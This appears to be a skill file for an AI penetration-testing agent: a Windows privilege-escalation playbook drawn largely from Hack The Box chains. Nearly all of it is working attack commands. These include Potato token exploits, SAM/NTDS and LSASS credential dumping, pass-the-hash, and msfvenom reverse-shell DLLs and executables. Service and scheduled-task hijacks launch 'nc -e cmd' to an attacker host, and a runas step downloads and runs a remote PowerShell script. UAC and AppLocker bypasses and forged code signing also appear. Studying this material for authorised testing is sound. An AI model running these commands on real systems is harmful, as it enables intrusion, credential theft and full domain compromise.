---
name: Windows Privilege Escalation
description: Escalate a Windows shell to SYSTEM/Administrator by triaging token privileges, service/DLL misconfig, scheduled tasks, stored creds, UAC, and credential dumping, with the concrete command ladder and proof for each.
tags: [privesc, windows, seimpersonate, potato, sebackup, sedebug, service-hijack, dll-hijack, uac-bypass, scheduled-task, secretsdump, pass-the-hash, adcs, gpo]
recommended_tools: [command_exec, powershell_exec, file_read, file_write, evil_winrm, impacket, netexec]
vuln_classes: [privilege_escalation]
domain: privesc
phase: privilege-escalation
---

# Windows Privilege Escalation

You have a shell as a low-priv user, service/AppPool identity, or medium-integrity admin. Goal: `nt authority\system`
or `Administrator` (verify with `whoami` / read of `C:\Users\Administrator\Desktop\root.txt`). Triage token
privileges first — they are the single highest-frequency win. Then service/DLL misconfig, then stored creds, then
kernel/CVE as last resort.

## First moves (always run)

```cmd
whoami /priv          # THE key output — SeImpersonate/SeBackup/SeDebug/SeRestore/SeManageVolume
whoami /groups        # Backup Operators, Administrators (filtered token?), GPO Creator Owners, Lansweeper/WSUS Admins
whoami /all
systeminfo           # OS build/patch level for kernel-CVE matching
```
```powershell
iwr http://<IP>/winPEASx64.exe -outfile wp.exe; .\wp.exe   # automated sweep, then confirm by hand
```
Priority (by frequency in real boxes): **SeImpersonate/Potato** > **stored creds → PtH/RunasCs** > **service/DLL
misconfig** > **SeBackup/SeRestore/SeDebug/SeManageVolume** > **scheduled task / writable script hijack** >
**UAC bypass** > **GPO/WSUS/ADCS abuse** > **kernel CVE** (noisy, last resort).

## Token privilege: SeImpersonate → Potato (MOST COMMON)

Any service account, MSSQL `sqlsvc`, IIS AppPool, or `LOCAL/NETWORK SERVICE` typically holds
`SeImpersonatePrivilege`. This is the workhorse escalation.
```powershell
iwr http://<IP>/GodPotato-NET4.exe -outfile gp.exe
.\gp.exe -cmd "powershell -e <B64_REVSHELL>"
```
- **From SQL:** `xp_cmdshell` → download + run GodPotato as the service context.
- **From IIS write access:** drop `shell.aspx` in `C:\inetpub\wwwroot`, get AppPool shell, then GodPotato.
- **Alternatives:** JuicyPotatoNG, PrintSpoofer, SweetPotato — all interchangeable for SeImpersonate.
- **Proof:** `whoami` returns `nt authority\system`.

### Token stripped? Restore it first
`LOCAL/NETWORK SERVICE` shells often lack `SeImpersonate` in the *current* token even though the account has it.
```powershell
.\FullPowers.exe -c "powershell -e <B64_REVSHELL>" -z      # scheduled-task trick restores full priv set
```
Or recover via named-pipe self-impersonation (service account holds the right but token was filtered):
```powershell
import-module .\NtObjectManager.psm1
$pipe = New-NtNamedPipeFile \\.\pipe\ABC -Win32Path
$file = Get-NtFile \\localhost\pipe\ABC -Win32Path
$token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "powershell shell.ps1"' -token $token
```
**Proof:** new `whoami /priv` lists `SeImpersonatePrivilege` Enabled → chain into GodPotato.

## Token privilege: SeBackup / SeRestore / Backup Operators

`whoami /priv` shows `SeBackupPrivilege` or membership in `BUILTIN\Backup Operators`. Read protected hives / NTDS.dit
in backup mode.
```cmd
reg save hklm\sam sam & reg save hklm\system system     # local: dump SAM
```
```
diskshadow /s C:\programdata\backup                      # DC: shadow-copy NTDS.dit
robocopy /b E:\Windows\ntds . ntds.dit                   # /b = backup-mode, bypasses lock
```
```bash
secretsdump.py -sam sam -system system LOCAL             # local Admin NT hash
secretsdump.py -ntds ntds.dit -system system LOCAL       # domain hashes
```
Backup dirs are also frequently exfiltrable directly (WSL `/mnt/c` mounts, shares holding `ntds.dit`+`SYSTEM`+`SECURITY`)
→ `secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit` offline.
**Proof:** local/Administrator NT hash extracted → Pass-the-Hash (below).

## Token privilege: SeDebug / SeManageVolume

- **SeDebugPrivilege** → impersonate/migrate into a SYSTEM process:
  ```powershell
  . .\psgetsys.ps1
  ImpersonateFromParentPid -ppid <WINLOGON_PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <B64>"
  # meterpreter alt: migrate <SYSTEM_PID>
  ```
  **Proof:** `whoami` = `nt authority\system`.
- **SeManageVolumePrivilege** → rewrite ACLs to grant Users full control of protected system files:
  ```cmd
  .\SeManageVolumeExploit.exe
  ```
  **Proof:** ACL entries changed; Users can now write DLLs into system paths → plant + trigger.

## Stored / recovered creds → run as privileged user

Whenever you recover an Administrator/local-admin password or hash, use it directly. This is the second most common
finish. Sources: unattend.xml, registry autologon (`HKLM\...\Winlogon` DefaultPassword), GPP `cpassword`, config
files, DPAPI blobs, keystroke capture, decrypted app DBs (Openfire, Veeam, Splunk).

- **Have password, low-priv shell:**
  ```powershell
  .\RunasCs.exe Administrator '<PASS>' cmd.exe -r <IP>:443            # reverse shell as that user
  .\RunasCs.exe <USER> '<PASS>' cmd.exe -r <IP>:443 --logon-type 5 --bypass-uac   # service logon-type restores SeImpersonate
  ```
- **Have NT hash (Pass-the-Hash):**
  ```bash
  evil-winrm -i <TARGET> -u administrator -H <HASH>
  wmiexec.py <DOMAIN>/administrator@<TARGET> -hashes :<HASH>          # add -k for Kerberos PtH
  psexec.py administrator@<TARGET> -hashes :<HASH>
  getTGT.py <DOMAIN>/administrator@<TARGET> -hashes :<HASH>           # then KRB5CCNAME=... evil-winrm -k
  netexec smb <TARGET> -u Administrator -H <HASH>                     # validate → (Pwn3d!)
  ```
- **DPAPI stored secrets** (masterkey + Credential Manager / browser blob, know user pass + SID):
  ```bash
  dpapi.py masterkey -file <MASTERKEY> -password '<PASS>' -sid <SID>
  dpapi.py credential -file <CRED_BLOB> -key <DECRYPTED_KEY>
  ```
- **Keystroke capture** (interactive user logs in periodically): meterpreter `migrate explorer.exe; keyscan_start; keyscan_dump`.

**Proof:** shell/exec as Administrator; `root.txt` readable.

## Service misconfig → SYSTEM

Enumerate: `sc query`, `wmic service get name,pathname,startname`, check ACLs with `accesschk` / `icacls`.

- **DLL hijack — writable dir loaded by a SYSTEM/admin service:** find the missing/loaded DLL (Ghidra, ProcMon),
  drop a payload DLL into the writable directory, wait for the service to load it.
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f dll -o <NAME>.dll
  ```
  ```cmd
  icacls "C:\path\to\pluginsdir"      # confirm (F) or (W) for your user
  ```
  Seen with Snort `dynamicpreprocessor`, XAMPP/web roots, AppLocker-bypassing DLLs loaded over SMB.
  **Proof:** reverse shell as the service identity (often SYSTEM/`administrator`) on next run.
- **World-writable web root → webshell as service account:** drop `<?php system($_REQUEST['cmd']); ?>` into a
  writable `C:\xampp\htdocs` / `wwwroot`; Apache/IIS often runs as SYSTEM or a service account. Then GodPotato.
- **COM/CLSID hijack — writable `HKCR\CLSID\{...}\InProcServer32`** (e.g. shell handler another user triggers):
  ```powershell
  Set-ItemProperty "Registry::HKCR\CLSID\{<CLSID>}\InProcServer32" -Name "(default)" -Value "C:\programdata\rev.dll"
  ```
- **Unquoted service path / weak service perms:** if you can write the binary path or reconfigure the service
  (`sc config <svc> binpath=...`), point it at your payload and restart.
- **Local IPC/WCF/RPC injection:** a SYSTEM service exposing localhost WCF/named-pipe/RPC that passes input into
  `Stop-Process -Name`/`cmd` unfiltered → command injection:
  ```powershell
  $p = New-WebServiceProxy -Uri "http://localhost:8000/Svc?wsdl" -Namespace WcfProxy
  $p.KillProcess('x; net localgroup administrators <USER> /add; #')
  ```
  **Proof:** command runs as SYSTEM; user added to Administrators.

## Scheduled task / writable script hijack

A task or service periodically runs a script/binary you can modify.
```cmd
schtasks /query /fo LIST /v          # find tasks + run-as identity
icacls "C:\path\to\script.ps1"        # confirm write access
```
```powershell
echo 'powershell -e <B64_REVSHELL>' >> C:\path\to\admin_run.ps1
```
- **LOLBIN input-file hijack:** a SYSTEM runner reading `command.txt`/config in a writable dir — drop your command.
- **Code-signing enforced (WDAC)?** if you hold the signing cert, re-sign the payload script:
  ```powershell
  Import-PfxCertificate -FilePath cert.pfx -Password (ConvertTo-SecureString '<PASS>' -AsPlainText -Force) -CertStoreLocation Cert:\CurrentUser\My
  Set-AuthenticodeSignature -FilePath run.ps1 -Certificate (gci Cert:\CurrentUser\My)[0]
  ```
- **Malicious doc dropped to a watched share** an admin auto-opens (LibreOffice CVE-2023-2255 macro ODT, etc.).
**Proof:** reverse shell as the task's/admin's identity on next fire (note the interval).

## AlwaysInstallElevated & MSI repair

- **AlwaysInstallElevated** — both keys = 1 → any MSI installs as SYSTEM:
  ```cmd
  reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
  ```bash
  msfvenom -p windows/x64/exec CMD='net localgroup administrators <USER> /add' -f msi -o e.msi
  ```
  ```cmd
  msiexec /quiet /qn /i e.msi
  ```
- **MSI repair race/oplock** (vulnerable installers spawn SYSTEM during `/fa` repair — Checkmk CVE-2024-0670,
  PDF24 CVE-2023-49147, VS collector CVE-2024-20656): seed read-only payload files or set an oplock (`SetOpLock.exe`)
  on a file the repair touches, then trigger. Often needs a full user token (supply via `RunasCs.exe`):
  ```cmd
  msiexec /fa "C:\Windows\Installer\<cached>.msi"
  ```
  **Proof:** SYSTEM `cmd`/batch executes during repair.

## UAC bypass (medium-integrity admin)

`whoami /groups` shows Administrators but you're medium integrity (filtered token). Elevate to high integrity.
```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "<CMD>" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe
```
Or from a password: `Start-Process powershell.exe -Verb runas`, or `RunasCs.exe <admin> <pass> ... --bypass-uac`.
**Proof:** high-integrity shell; `SeDebugPrivilege`/`SeImpersonatePrivilege` present; `root.txt` readable.

## Credential dumping (already SYSTEM / local admin)

Once elevated, harvest for lateral movement / domain compromise.
```
mimikatz # privilege::debug # sekurlsa::logonpasswords # lsadump::sam
```
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
- **HiveNightmare/SeriousSAM (CVE-2021-36934):** world-readable SAM on Win10 ≥1809 → read hives from shadow copies, no admin needed (`.\HiveNightmare.exe`).
- **DCSync** (on DC or with a virtual/service account whose network identity is the machine account):
  ```powershell
  .\rubeus.exe tgtdeleg /nowrap
  ```
  ```bash
  secretsdump.py -k -no-pass <DC_FQDN>      # fix clock skew with ntpdate first
  ```
**Proof:** Administrator/krbtgt NT hash dumped → PtH.

## Domain-privileged position abuse

If your account holds a specific delegated right, use the matching tool. Proof for all: SYSTEM/DA shell.
- **Group Policy Creator Owners** → create+link GPO, inject SYSTEM task: `SharpGPOAbuse --addcomputertask`; `gpupdate /force`.
- **WSUS Administrator** (DC is its own client) → push signed PsExec "update": `SharpWSUS create/approve`.
- **ADCS ESC7 (ManageCA)** → add officer, issue Administrator cert, `certipy auth` → hash → PtH.
- **ADCS enrollment (ESC1/user template)** → `certipy req -template user`, `certipy auth` for hash.
- **KrbRelayUp / KrbRelay** (LDAP signing off, MAQ>0) → RBCD or add self to Administrators.
- **Cross-session NTLM relay** (`qwinsta` shows a privileged user on another session) → RemotePotato0/KrbRelay to steal + crack their NetNTLMv2.

## Vendor / product exploits (version-gated)

When a privileged local service matches a known vuln, jump straight to the exploit. Confirm version first.
- **Veeam B&R <11.0.1.1261** (TCP 9401) → `VeeamHax.exe` (CVE-2023-27532) → SYSTEM.
- **Velociraptor server** (readable `server.config.yaml`) → forge admin API client, VQL `execve` as SYSTEM.
- **Lansweeper Admins** → deployment package "run as Local System" → revshell.
- **Splunk/Openfire admin** → malicious app/plugin upload → service-account RCE → GodPotato.
- **ManageEngine ADSelfService (CVE-2022-47966)** → SAML RCE (via SOCKS proxy) → SYSTEM meterpreter.
- **Docker Engine API exposed to container** (2375, unauth) → create privileged container binding host FS → root.

## Kernel / driver CVE (last resort — noisy, unstable)

Match `systeminfo` build/patch to a public PoC; swap in a rev-shell payload before running.
- **CLFS EoP (CVE-2023-28252 Nokoyawa):** `.\clfs_eop.exe`.
- **Vulnerable signed driver** exposing arbitrary R/W IOCTLs → EPROCESS token swap (steal SYSTEM PID 4 token).
- **RpcEptMapper perf-counter (Perfusion, 2008R2):** `.\Perfusion.exe -c cmd -i`.

**Proof:** new shell `whoami` = `nt authority\system`.

## Real-world chains (0xdf HTB)

Battle-tested ladders from real boxes. Placeholders: `<IP>` attacker, `<TARGET>`/`<DOMAIN>` victim, `<USER>`/`<PASS>`/`<HASH>` recovered creds, `<PORT>` listener, `<SVC>`/`<CLSID>`/`<PID>` context-specific. Each has a PROOF indicator to confirm success.

### Weak ACL on a protected file/folder
Low-priv user has Full/Modify on an admin-owned path — grant yourself read or overwrite directly, no full admin needed.
```cmd
icacls C:\Users\Administrator\Desktop\root.txt /grant <USER>:F
type C:\Users\Administrator\Desktop\root.txt
```
**PROOF:** protected `root.txt` readable without SYSTEM/admin token.

### Autologon creds from Winlogon registry
`AutoAdminLogon` may cache the admin password in cleartext.
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```
**PROOF:** Administrator plaintext credential recovered → RunasCs/PtH.

### Run as admin via PSCredential + Invoke-Command (password reuse)
Have Administrator (or another local user's) plaintext — execute in their context. Also covers DB/service password reuse.
```powershell
$sec = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>',$sec)
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }   # or -r reverse shell
net use \\127.0.0.1\c$ /user:administrator "<PASS>"; type \\127.0.0.1\c$\users\administrator\desktop\root.txt
```
Alt tooling for the same recovered password: `winexe -U '.\administrator%<PASS>' //<TARGET> cmd.exe`, `psexec.py administrator:'<PASS>'@<TARGET>`, `ssh administrator@<TARGET>`.
**PROOF:** `whoami` returns the target admin; `root.txt` read.

### Oracle external-table OS command exec (odat)
Oracle `sysdba` can write a binary to disk and run it as SYSTEM.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
odat utlfile -s <TARGET> -d XE -U <USER> -P <PASS> --putFile \temp shell.exe shell.exe
odat externaltable -s <TARGET> -d XE -U <USER> -P <PASS> --exec \temp shell.exe
```
**PROOF:** meterpreter as `nt authority\system`.

### SeImpersonate → legacy Potato variants
Older service accounts on legacy Windows use the era-appropriate Potato. All interchangeable with modern GodPotato when the classic CLSIDs are needed.
```cmd
whoami /priv
lonelypotato.exe * C:\users\<USER>\appdata\local\temp\rev.bat     :: RottenPotato/LonelyPotato
jp.exe -t * -p <PROGRAM>.bat -l 9001 -c {<CLSID>}                 :: JuicyPotato (e.g. {e60687f7-01a1-40aa-86ac-db1cbf673334})
RoguePotato.exe -r <IP> -l 9999 -e C:\programdata\rev.bat        :: needs socat/chisel 135 relay
SweetPotato.exe -p "\programdata\nc64.exe" -a "-e powershell <IP> <PORT>"
churrasco -d "C:\wmpub\nc.exe -e cmd.exe <IP> <PORT>"            :: Server 2003 RPCSS token theft
csc.exe efspotato.cs && efspotato.exe whoami                     :: EfsPotato, MS-EFSR coercion
GenericPotato -p 8888 -c 'nc64.exe <IP> <PORT> -e powershell'    :: SSRF-fed token impersonation
```
**PROOF:** `whoami` / "CreateProcessWithTokenW OK" → `nt authority\system`.

### Kernel-exploit matching for unpatched hosts
Legacy boxes (2003/2008/Win7) with zero hotfixes — enumerate then match a public PoC. Escape a 32-bit shell to 64-bit first (`C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe`) if the kernel bug needs it.
```cmd
systeminfo
```
```powershell
Watson.exe ; Import-Module .\Sherlock.ps1; Find-AllVulns    # or windows-exploit-suggester.py / local_exploit_suggester
```
Common matches (swap in a rev-shell payload; run from a share): MS10-015 KiTrap0d (CVE-2010-0232), MS10-059 Chimichurri, MS10-092 schelevator, MS11-046 AFD.sys (CVE-2011-1249), MS14-058 TrackPopupMenu (CVE-2014-4113), MS15-051 (CVE-2015-1701), MS16-032 secondary-logon (CVE-2016-0099, `Invoke-MS16032`), CVE-2017-0213 (needs Session 1 / `migrate explorer.exe`).
```cmd
\\<IP>\share\<exploit>.exe "whoami"
\\<IP>\share\<exploit>.exe "\\<IP>\share\nc64.exe -e cmd.exe <IP> <PORT>"
```
**PROOF:** `whoami` = `nt authority\system`.

### MOF autorun code execution (legacy XP/2003)
Drop a `.mof` into `wbem\mof\` — WMI auto-compiles an ActiveScriptEventConsumer running your command as SYSTEM.
```cmd
tftp <IP>
binary
put nc.exe \windows\system32\nc.exe
put payload.mof \windows\system32\wbem\mof\payload.mof
```
**PROOF:** reverse shell as `nt authority\system` (MS10-061 class).

### Loot admin creds from WSL / app credential stores
Admins frequently leave secrets in WSL history or third-party manager configs.
```cmd
where /R c:\ bash.exe && bash.exe -c "cat ~/.bash_history | grep -i smbclient"   :: WSL .bash_history
type C:\Users\<USER>\AppData\Roaming\mRemoteNG\confCons.xml                       :: mRemoteNG (default pass mR3m) → decrypt
cmdkey /list                                                                      :: cached creds for runas /savecred
```
Then authenticate: `runas /user:<DOMAIN>\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://<IP>/shell.ps1')"`.
**PROOF:** admin password recovered/used; `root.txt` read.

### Phantom-binary / missing-EXE service hijack
A LocalSystem service tries to exec a missing binary from a writable dir — plant it there and restart.
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o rev.exe
copy \\<IP>\smb\rev.exe C:\ProgramData\<service-dir>\taskkill.exe    # e.g. UniFiVideoService (EDB-43390)
Stop-Service -Name <SVC> -Force
```
**PROOF:** reverse shell as `nt authority\system` on service stop/start.

### Writable service binPath / ImagePath / registry-ACL hijack
Service account can reconfigure a SYSTEM service, or holds FullControl on the Services registry key. Also the path for `Server Operators` / `UsoSvc`-style weak ACLs.
```cmd
accesschk.exe -uvwc *
sc.exe config <SVC> binPath= "C:\programdata\nc64.exe -e cmd.exe <IP> <PORT>"
sc.exe stop <SVC> & sc.exe start <SVC>
```
```powershell
Set-ItemProperty -path HKLM:\SYSTEM\CurrentControlSet\Services\<SVC> -name ImagePath -value 'C:\path\nc64.exe -e cmd <IP> <PORT>'
Start-Service <SVC>
```
**PROOF:** SYSTEM reverse shell on service restart.

### Sign a malicious MSI/binary with a stolen CA
A launcher only runs artifacts signed by a trusted CA whose key you looted — forge and sign.
```cmd
makecert.exe -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic myca.cer -iv myca.pvk -sv MySPC.pvk MySPC.cer
pvk2pfx.exe -pvk MySPC.pvk -spc MySPC.cer -pfx MySPC.pfx
signtool.exe sign /v /f MySPC.pfx /fd sha256 /tr http://timestamp.digicert.com /td sha256 <PAYLOAD>.msi
```
**PROOF:** `signtool verify /pa` passes; artifact runs as the privileged launcher's identity.

### AppLocker / Constrained-Language-Mode bypass
CLM/AppLocker blocks normal exec — pivot through a trusted managed host or LOLBIN.
```cmd
:: COR Profiler DLL injection into a whitelisted .NET binary (powershell, tzsync)
set COR_ENABLE_PROFILING=1
set COR_PROFILER={<CLSID>}
set COR_PROFILER_PATH=C:\path\rev.dll
powershell
:: MSBuild / InstallUtil inline C# payload
c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe <PAYLOAD>.csproj
```
Also escape a JEA/CLM runspace with the nested call operator: `&{ powershell -enc <B64_REVSHELL> }`.
**PROOF:** FullLanguage / unconstrained reverse shell as the invoking user.

### PowerUp surfaces GPP cpassword → decrypt
`Invoke-AllChecks` finds cached Group Policy Preferences `cpassword` for a local admin.
```powershell
. .\PowerUp.ps1 ; Invoke-AllChecks
```
```bash
gpp-decrypt <CPASSWORD>    # read Groups.xml from Group Policy\History\...\Preferences\Groups\
```
**PROOF:** Administrator plaintext recovered (MS14-025) → PtH/RunasCs.

### Arbitrary-write service → named-pipe impersonation / DiagHub DLL load
A custom SYSTEM service writes to attacker-controlled paths (via a LogFile/backup param). Point it at a named pipe to steal a token, or drop a DLL into System32 for DiagHub to load.
```cmd
reg query HKLM\System\CurrentControlSet\Services\<SVC>
:: set service LogFile / backup name = \\.\pipe\dummypipe  (path-traversal or base64-decoded name)
```
```powershell
powershell -f pipeserverimpersonate.ps1     # capture connecting SYSTEM/target token
ALPC-TaskSched-LPE.exe                       # DiagHub loads planted System32 DLL as SYSTEM
```
**PROOF:** captured token / `whoami` = `nt authority\system`; `root.txt`.

### Alternative UAC bypasses (medium-integrity admin)
Beyond fodhelper: CMSTP, or DLL search-order hijack via WindowsApps PATH precedence.
```powershell
$c = New-Object PSCredential('<DOMAIN>\<USER>',<PW>); Enter-PSSession -Cred $c
Add-Type -TypeDefinition ([IO.File]::ReadAllText('Source.cs')) -OutputAssembly bypass.dll
[CMSTPBypass]::Execute('<NC> -e cmd <IP> <PORT>')
```
```cmd
i686-w64-mingw32-g++ -shared -o srrstr.dll evil.cpp
copy srrstr.dll "%LOCALAPPDATA%\Microsoft\WindowsApps\" & SystemPropertiesAdvanced.exe
```
**PROOF:** elevated/high-integrity shell reads `root.txt`.

### Command injection into a sanitized PS runner via whitespace bypass
A scheduled script builds a command from file input and filters spaces — smuggle tabs/backticks past the filter into `Invoke-Expression`.
```cmd
echo ";$c=get-content`ta;iex`t`$c;#" > E:\Scripts\Processing\backups.txt
```
**PROOF:** injected PowerShell executes in the runner's (privileged) context.

### WinRM as admin over CredSSP (double-hop)
CredSSP delegates creds for encrypted/double-hop resources.
```powershell
Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\administrator -Authentication CredSSP
```
**PROOF:** Administrator PSSession established.

### Dump another user's process memory for plaintext creds
A process (browser, custom app) holds a logged-in session or hardcoded secret — dump and grep, or RE the binary.
```cmd
procdump64 -ma <PID> -accepteula          :: Firefox PID via tasklist
```
```bash
grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' <dump>.dmp
```
Alt: open the binary (`RemoteConnection.exe`-style) in IDA/x32dbg, breakpoint the `ShellExecuteW`/exec call, read the hardcoded password from memory.
**PROOF:** plaintext credential extracted → WinRM/SSH (`evil-winrm -i <TARGET> -u <USER> -p '<PASS>'`).

### Admin-triggered malicious document / help file
An admin (or Startup-folder monitor) auto-opens files dropped in a watched dir — plant a payload doc.
```powershell
Out-CHM -Payload "<PATH>\nc64.exe -e cmd <IP> <PORT>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
copy doc.chm C:\Docs\    # Startup script runs CHMs whose first bytes match; also .lnk/macro variants
```
**PROOF:** reverse shell as the admin/SYSTEM identity on next monitor cycle.

### Post-foothold enumeration for anomalous automation
Hunt scheduled tasks and elevated processes that reveal a hijack vector.
```cmd
schtasks /query /v /fo LIST | findstr <KEYWORD>
```
```powershell
Get-WmiObject Win32_Process | Select-Object ProcessId, ProcessName, CommandLine
```
**PROOF:** custom/anomalous SYSTEM task or process identified as the target.

### DnsAdmins → serverlevelplugindll DLL load on DC
Member of `DnsAdmins` can make the DNS service (SYSTEM) load an arbitrary DLL.
```cmd
whoami /groups
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o rev.dll
smbserver.py s .
```
```cmd
dnscmd.exe /config /serverlevelplugindll \\<IP>\s\rev.dll
sc.exe \\<TARGET> stop dns & sc.exe \\<TARGET> start dns
```
**PROOF:** reverse shell as `nt authority\system` on DNS restart.

### Azure AD Connect — dump synced DA password
Member of the AAD sync admin group can read the ADSync LocalDB and decrypt the synced Administrator password.
```powershell
# query ADSync LocalDB: mms_server_configuration (keyset_id,instance_id,entropy) + mms_management_agent (encrypted_configuration, ma_type='AD')
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
# KeyManager.LoadKeySet + DecryptBase64ToString()
```
**PROOF:** domain Administrator plaintext recovered → `evil-winrm -i <TARGET> -u administrator -p '<PASS>'`.

### Vendor local-service exploits (version-gated)
When a privileged local service matches a known vuln, jump to the exploit after confirming version.
- **NSClient++ 0.5.2.35** (SYSTEM) → authenticate web UI, add external script + 10s scheduler task, reload (EDB-46802).
- **TeamViewer 7** → decrypt `HKLM\...\TeamViewer\Version7` `SecurityPasswordAES` (static AES-128-CBC key/IV, CVE-2019-18988).
- **Ricoh PCL6 driver** → writable `C:\ProgramData\RICOH_DRV` DLL hijack (CVE-2019-19363, msf `ricoh_driver_privesc`).
- **CloudMe 1.11.2** (loopback `127.0.0.1:8888`, find via `netstat -ano | findstr ":0"`) → BOF with bad-char-clean payload → admin.
- **Windows Device Portal** (8080) → authenticate, Process > Run command `nc.exe -e cmd <IP> <PORT>`.
- **Azure DevOps Build Admin** → malicious pipeline `script: c:\programdata\nc.exe -e cmd <IP> <PORT>` runs as SYSTEM.
- **WCF/RPC endpoint** exposing an `InvokePowerShell`/unvalidated method as SYSTEM → compiled client calls it.
```powershell
Invoke-Nightmare -NewUser <USER> -NewPassword <PASS>    # PrintNightmare CVE-2021-1675 → new local admin
```
**PROOF:** reverse shell / new admin as `nt authority\system`; `root.txt`.

### Buffer overflow of a local SYSTEM service/app
A custom listener or app (`bankv2.exe`, `MyFirstApp.exe`, CloudMe) runs as SYSTEM with an exploitable BOF — hijack EIP or the exec path.
```bash
msf-pattern_create -l 40 ; msf-pattern_offset -q <BYTES>
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\x0A\x0D' -f python
```
Reuse the listening socket for `recv()` when a fresh connection is blocked; brute a numeric PIN first if the service gates input.
**PROOF:** reverse shell as `nt authority\system`.

### SeLoadDriverPrivilege → load vulnerable driver
Token holds `SeLoadDriverPrivilege` — register and load an unsigned vulnerable driver (Capcom.sys) to steal the SYSTEM token.
```powershell
whoami /priv
.\eoploaddriver.exe System\CurrentControlSet\<key> C:\ProgramData\Capcom.sys
.\ExploitCapcom.exe          # or Import-Module .\Capcom-Rootkit.ps1; Capcom-ElevatePID <PID>
```
**PROOF:** launches reverse shell as `nt authority\system`.

### SeBackup/SeRestore via diskshadow VSS → ntds.dit
Backup Operators / `SeBackupPrivilege` reads locked files through a shadow copy (also the SAM/SYSTEM path).
```cmd
diskshadow /s script.txt
```
```powershell
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\<IP>\s\ntds.dit
reg.exe save hklm\system \\<IP>\s\system
```
**PROOF:** `ntds.dit` + SYSTEM hive exfiltrated → offline `secretsdump.py` → PtH.

### SeManageVolume → re-ACL drive to read restricted files
Token holds `SeManageVolumePrivilege` — `FSCTL_SD_GLOBAL_CHANGE` grants Users rights across the volume.
```cmd
.\SeManageVolumeAbuse.exe
```
**PROOF:** previously unreadable admin `root.txt` becomes readable (or plant a DLL in a now-writable system path).

### Weak Net-NTLMv1 coercion (LMCompatibilityLevel low)
Host allows NTLMv1 — coerce machine-account auth (Defender scan / RPC) and capture a crackable Net-NTLMv1 with a fixed challenge.
```bash
responder -I <IFACE> --lm
```
```cmd
MpCmdRun.exe -Scan -ScanType 3 -File \\<IP>\share\file.txt
RoguePotato.exe -r 127.0.0.1:6666
```
**PROOF:** captured `<HOST>$` Net-NTLMv1 (challenge 1122334455667788) → crack → machine hash.

### WerTrigger — DLL hijack via Windows Error Reporting
A WER queue task loads a now-attacker-controlled `phoneinfo.dll` planted in System32 (chains from an arbitrary-write primitive).
```cmd
mkdir C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e
```
```powershell
iwr http://<IP>/Report.wer -outfile ...\reportqueue\a_b_c_d_e\Report.wer
schtasks /run /tn 'Microsoft\Windows\Windows Error Reporting\QueueReporting'
```
**PROOF:** shell as `nt authority\system` (CVE-2021-1732 class).

### JEA path traversal to read arbitrary files
A constrained JEA endpoint exposes a file-read function limited to certain dirs — traverse out.
```powershell
Enter-PSSession -ComputerName <TARGET> -ConfigurationName <jea_config> -Credential <USER>
Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
```
**PROOF:** `root.txt` contents returned.

### Race-condition code injection into ASP.NET compile temp
IIS-group write access to the ASP.NET temp compile dir — inject into `App_Web_*.cs` before `csc.exe` recompiles it as SYSTEM.
```powershell
del *    # register FileSystemWatcher on App_Web_*.cs, inject on create
iwr http://127.0.0.1:8080 -UseBasicParsing    # trigger ~60s recompile
```
**PROOF:** injected code runs; reverse shell as `nt authority\system`.

### Boot2docker / mounted-partition key theft
A Linux VM/container mounts the Windows C: drive — read the Administrator SSH key as root.
```bash
cat /c/Users/Administrator/.ssh/id_rsa && chmod 600 key
ssh -i key administrator@<TARGET>
```
**PROOF:** SSH as Administrator on the Windows host; `root.txt`.

### Read gMSA password → abuse delegation to reset a privileged account
User can read a gMSA managed password; the gMSA holds `GenericAll`/reset rights over a domain admin.
```powershell
$g = Get-ADServiceAccount -Identity <GMSA> -Properties 'msDS-ManagedPassword'
$sp = (ConvertFrom-ADManagedPasswordBlob $g.'msDS-ManagedPassword').SecureCurrentPassword
Invoke-Command -ComputerName 127.0.0.1 -Cred $cred -ScriptBlock { Set-ADAccountPassword -Identity <ADMIN> -reset -NewPassword (ConvertTo-SecureString -AsPlainText '<PASS>' -force) }
```
**PROOF:** target admin password reset → `wmiexec.py <DOMAIN>/<ADMIN>:<PASS>@<TARGET>`.

### Scheduled .bat/.ps1 runner adds you to a privileged group
A loop runs every `.bat` in a writable dir as a privileged user — drop one that grants group membership or overwrites via NUL-truncation.
```cmd
echo net group site_admin <USER> /add /domain > "C:\Program Files\keepmeon\0xdf.bat"
cmd /c copy /y NUL C:\path\clean.bat & cmd /c "echo <PAYLOAD> >> C:\path\clean.bat"    :: reset ACL-less writable .bat
```
